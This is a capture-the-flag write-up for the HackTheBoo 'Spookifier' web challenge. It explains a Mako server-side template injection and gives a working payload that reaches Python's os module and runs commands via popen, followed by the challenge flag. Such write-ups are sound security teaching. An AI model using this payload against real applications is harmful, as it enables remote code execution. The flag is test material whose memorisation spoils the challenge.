# HackTheBoo - Spookifier

* **Category:** Web
* **Points:** 200
* **Author:** xcl0w3n  

## Challenge

> There's a new trend of an application that generates a spooky name for you. Users of that application later discovered that their real names were also magically changed, causing havoc in their life. Could you help bring down this application?

## Solution
![image](https://user-images.githubusercontent.com/78451563/198273040-f00d5306-8031-4cd5-9a8d-7ed415bc1c11.png)

* In the `util.py` we can see the template (`Mako`) in use which could hint for a potential `SSTI` vuln.
* The function `Template()` is used on our results which we control therefore allows an attacker to include template code into an existing template.

[PayloadAllThings Mako](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#mako)

```python
>>> print(Template("${self.module.cache.util.os}").render())
<module 'os' from '/usr/local/lib/python3.10/os.py'>
```
*It seems that using `os.system` to run arbitary commands would only display the return code of the process for example 0, meaning Success*
* I modified the POC to use `popen` and `read` to execute and display.


![image](https://user-images.githubusercontent.com/78451563/198278004-a5ddbe2a-8477-46fe-a734-b97f2e347adf.png)

```python
${self.module.cache.util.os.popen('id').read()}
```


```
Flag: HTB{t3mpl4t3_1nj3ct10n_1s_$p00ky!!}
```
